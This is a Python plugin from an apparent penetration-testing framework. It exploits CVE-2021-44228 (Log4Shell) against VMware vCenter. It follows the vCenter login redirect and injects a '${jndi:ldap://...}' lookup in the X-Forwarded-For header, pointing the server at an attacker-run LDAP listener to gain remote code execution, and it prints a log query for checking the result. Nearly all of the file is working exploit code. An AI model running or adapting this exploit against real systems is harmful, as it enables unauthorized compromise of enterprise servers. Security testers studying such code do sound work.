import argparse
from copy import copy

from requests import Session

from plugins.VCenter import PluginVCenterBase
from utils import output
from utils.consts import AllPluginTypes


class PluginVCenterCVE_2021_44228(PluginVCenterBase):
    display = "CVE-2021-44228"
    alias = "cve_2021_44228"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-i", "--ip", help="target ip address.(192.168.1.1)", required=True, dest="address")
        parser.add_argument("-l", "--listen-ip", help="listener ip", required=True, dest="listen_ip")
        parser.add_argument("-p", "--listen-port", help="listener port", required=True, dest="listen_port")

        parser.add_argument("--proxy", help="proxy", dest="proxy")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        ip = args.address
        listen_ip = args.listen_ip
        listen_port = args.listen_port
        proxy = args.proxy

        url = f'https://{ip}'
        ldap = f'ldap://{listen_ip}:{listen_port}'
        # ldap = config.get('jndi')
        with Session() as s:
            s.proxies = proxy
            s.verify = False
            try:
                r = s.get(f'{url}/ui/login', allow_redirects=False)
                output.info(r.status_code)

                r = s.get(r.headers.get('Location').split('?')[0], headers={
                    'X-Forwarded-For': '${jndi:' + ldap + '}'
                }, params={'SAMLRequest': ''}, timeout=2)
                output.info(r.status_code)
            except Exception as e:
                output.error(e)
        output.info(f'host: {ip} and sso.message:* and syslog5424_app : websso')
        return result
